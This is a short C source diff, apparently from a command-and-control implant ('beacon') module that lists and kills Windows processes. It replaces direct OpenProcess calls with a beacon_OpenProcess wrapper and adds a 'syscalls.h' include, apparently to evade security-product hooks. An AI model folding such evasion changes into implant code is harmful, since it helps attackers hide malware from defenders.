@@ -2,6 +2,7 @@
  * List and Kill Processes
  */
 #include <windows.h>
+#include "syscalls.h"
 #include <stdio.h>
 #include <tlhelp32.h>
 #include "tokens.h"
@@ -19,7 +20,7 @@ void command_ps_kill(char * buffer, int length) {
 	data_init(&parser, buffer, length);
 	pid = data_int(&parser);
 
-	h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	h = beacon_OpenProcess(PROCESS_TERMINATE, FALSE, pid);
 	if (h && TerminateProcess(h, 0)) {
 		/* do nothing, we're good */
 	}
@@ -107,7 +108,7 @@ void command_ps_list(char * buffer, int length, void (*callback)(char * buffer, 
 	// Now walk the snapshot of processes, and
 	// display information about each process in turn
 	do {
-		hProcess = OpenProcess(is_vista_or_later() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );
+		hProcess = beacon_OpenProcess(is_vista_or_later() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );
 
 		if( !hProcess ) {
 			bformat_printf(&format, "%s\t%d\t%d\n", pe32.szExeFile, pe32.th32ParentProcessID, pe32.th32ProcessID);
